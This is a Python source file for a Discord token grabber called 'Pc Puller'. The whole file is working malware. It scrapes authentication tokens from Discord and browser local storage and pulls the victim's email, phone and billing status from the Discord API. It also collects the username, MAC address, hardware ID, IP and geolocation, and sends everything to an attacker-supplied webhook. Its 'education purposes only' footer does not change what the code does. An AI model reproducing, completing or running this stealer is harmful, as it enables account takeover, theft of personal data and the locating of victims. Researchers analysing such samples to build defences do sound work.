import os, re, uuid, platform, sys, requests, random, subprocess, pyautogui
from urllib.request import Request, urlopen
from json import dumps, loads
from base64 import b64decode
from re import findall
webhookname = "Pc Puller"
webhookurl = "YourWebhookHere"

# Add vpn detect, loaction, ram, gpu, cpu,

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {

    "Discord": ROAMING + "\\Discord",

    "Discord Canary": ROAMING + "\\discordcanary",

    "Discord PTB": ROAMING + "\\discordptb",

    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",

    "Firefox" : LOCAL + "\\Mozilla\\Firefox\\User Data\\Profiles",

    "Opera" : ROAMING + "\\Opera Software\\Opera Stable",

    "Edge" : LOCAL + "\\\Microsoft\\Edge\\User Data\\Default",

    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",

    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",

    "Sputnik": LOCAL + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
    
    "Opera GX": ROAMING + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
    
    "Microsoft Edge": LOCAL + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
   
    "Iridium": LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
    
    "Epic Privacy Browser": LOCAL + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
    
    "Lightcord": ROAMING + "\\Lightcord\\Local Storage\\leveldb\\"

}

if os.name != 'nt':
    exit()

if hasattr(sys, 'real_prefix'):
    exit()


def getheaders(token=None, content_type="application/json"):
    headers = {

        "Content-Type": content_type,

        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"

    }

    if token:
        headers.update({"Authorization": token})

    return headers

def prePairInfo():

    victim_pc = {}
    victim_pc["os"]   =   ":x:"
    victim_pc["os_ver"] =   ":x:"
    victim_pc["username"] =   ":x:"
    victim_pc["pc_name"] =   ":x:"
    victim_pc["mac_address"] =   ":x:"
    victim_pc["hwid"] = ":x:"

    try:
        victim_pc["os"] = platform.system()
        victim_pc["os_ver"] = platform.version()
        victim_pc["username"] = os.getenv("UserName")
        victim_pc["pc_name"] = os.getenv("COMPUTERNAME")
        victim_pc["mac_address"] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        victim_pc["hwid"] = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

    except:
        pass

    return victim_pc


def format_ip_info():

    ip = get_ip().decode()
    if(ip != "Unknown"):
        ip_info = requests.get( f"http://ip-api.com/json/{ip}?fields=country,countryCode,region,regionName,city,zip,lat,lon,timezone,proxy,as").text.encode()

        ip_info_str = ip_info.decode().replace('{', "").replace('}', "").replace('"', "")
        ip_info_list = re.split(':|,', ip_info_str)
        ip_info_list = [x for i, x in enumerate(ip_info_list) if i%2 !=0]
        if(ip_info_list[10] == "false"):
            ip_info_list[10] = ":red_circle:"
        else:
            ip_info_list[10] = ":green_circle:"
        return ip_info_list
    else:
        pass

def get_ip():

    victim_ip = "Unknown"
    try:

        victim_ip = requests.get("https://api.ipify.org").text.encode()

    except:
        pass

    return victim_ip


def main():

    checked = []
    working_ids = []
    for platform, path in PATHS.items():

        if not os.path.exists(path):
            continue

        for token in gettokens(path):

            if token in checked:
                continue

            checked.append(token)

            uid = None

            if not token.startswith("mfa."):

                try:

                    uid = b64decode(token.split(".")[0].encode()).decode()

                except:

                    pass

                if not uid or uid in working_ids:
                    continue

            user_data = getVictimDcdata(token)

            if not user_data:
                continue
    sendembed(token)


def sendembed(token):

    colors = [0xFFE4E1, 0x00FF7F, 0xD8BFD8, 0xDC143C, 0xFF4500, 0xDEB887, 0xADFF2F, 0x800000, 0x4682B4, 0x006400,
              0x808080, 0xA0522D, 0xF08080, 0xC71585, 0xFFB6C1, 0x00CED1]

    user_dc_data = getVictimDcdata(token)

    victim_payment = GetCivtimDcPaymentMethod(token)
    victim_nitro = bool(user_dc_data.get("premium_type"))
    victim_ip = get_ip().decode()
    victim_pc = prePairInfo()
    victim_network = format_ip_info()
    avatar_url = getDcAvatar(user_dc_data["id"], user_dc_data["avatar"])

    random_color = random.choice(colors)

    embed_author = user_dc_data['username'] + "#" + user_dc_data['discriminator']
    embeds = []
    embed = {
       "color": random_color,

       "fields": [
           {

               "name": "**Discord**",
               "value": f"**Phone:** {user_dc_data['phone']}\n**Email:** {user_dc_data['email']}\n**Billing Info:** {victim_payment}\n**Nitro:** {victim_nitro}",

               "inline": True
           },
           {

               "name": ":space_invader:**Network**",
               "value": f"**Proxy\VPN:** {victim_network[10]}\n**IP:**  {victim_ip}\n**AS:** {victim_network[9]}",

               "inline": True
           },
           {
               "name": chr(173),
               "value": "**Token:**",
               "inline": False

           },

           {
               "name": f"||{token}||",
               "value": chr(173),
               "inline": False

           },

           {
               "name": ":desktop:**Computer**",

               "value": f"**OS:** {victim_pc['os']} | {victim_pc['os_ver']}\n**User:** {victim_pc['username']}\n**Pc Name:** {victim_pc['pc_name']}\n**Mac Address:** {victim_pc['mac_address'].upper()}\n**HWID:** {victim_pc['hwid']}",
               "inline": True

           },

           {
               "name": ":map:**Victim Location**",
               "value": f"**Country:** {victim_network[0]} | {victim_network[1]}\n**City:** {victim_network[4]}\n**Zip:** {victim_network[5]}\n**Timezone:** {victim_network[8]}\n [Location](https://www.google.com/maps/place/@{victim_network[6]},{victim_network[7]})",
               "inline": True

           },

           {
               "name": chr(173),
               "value": chr(173),
               "inline": False

           },
        ],

       "author": {
           "name": f"{embed_author} | ({user_dc_data['id']})",
           "icon_url": avatar_url

        },

        "footer": {
            "text": f"Logger made by: Levi2288 | For education purposes only!",
            "icon_url": "https://i.pinimg.com/474x/60/5e/ac/605eac3124c4885e067002cdd4ff684a.jpg"

        }
    }
    embeds.append(embed)

    webhook = {

        "content": "",

        "embeds": embeds,

        "username": "Levi2288-Pc-Puller",

        "avatar_url": "https://cdn1.savepice.ru/uploads/2021/4/27/7c17bf724105d4506e30f0718885860c-full.png"
    }

    try:

        urlopen(Request(
            webhookurl,
            data=dumps(webhook).encode(), headers=getheaders()))

    except:
        pass

def getVictimDcdata(token):

    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass

def GetCivtimDcPaymentMethod(token):
    try:

        return loads(
            urlopen(Request("https://discordapp.com/api/v9/users/@me/billing/payment-sources",
                                              headers=getheaders(token))).read().decode()) > 0

    except:

        pass
def getDcAvatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"

    try:

        urlopen(Request(url))

    except:

        url = url[:-4]

    return url

def gettokens(path):
    path += "\\Local Storage\\leveldb"

    tokens = []

    for file_name in os.listdir(path):

        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue

        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:

            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):

                for token in findall(regex, line):
                    tokens.append(token)

    return tokens

def screenshot(self):
    image = pyautogui.screenshot()
    image.save(self.tempfolder + "\\Screenshot.png")

if __name__ == '__main__':
    main()
